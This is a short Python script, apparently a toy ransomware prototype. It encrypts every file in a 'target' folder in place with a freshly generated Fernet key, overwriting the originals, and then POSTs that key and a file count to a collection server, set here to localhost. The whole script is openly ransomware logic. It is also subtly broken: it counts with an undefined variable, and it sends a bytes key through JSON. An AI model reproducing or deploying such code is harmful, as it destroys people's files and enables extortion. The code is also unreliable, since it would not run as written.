from cryptography.fernet import Fernet
from keygen import genKey
import requests

import os 

# Config
url = 'http://127.0.0.1:5000/post'

# >generate master key
key = genKey()

# >take all the files
files = os.listdir("./target")
numerofencryptedfiles = 0

# >encrypt each file with the master key
for filepath in files:
    print("Reading")
    with open("./target/"+filepath,"rb") as f:
        print(filepath,"-"*50)
        message = f.read()
        f.close()
    print("Writing")
    fernet = Fernet(key)
    cipherText = fernet.encrypt(message)
    with open("./target/"+filepath,"wb") as f:
        print(filepath,"-"*50)
        f.write(cipherText)
        numFiles += 1
        f.close()


# >send master key to server (using POST request)
request = requests.post(url, json={'key': key,'numFiles': numFiles})
if request.status_code == 200:
    print("Key sent succesfully")
else:
    print("Error on request: ", request.reason)




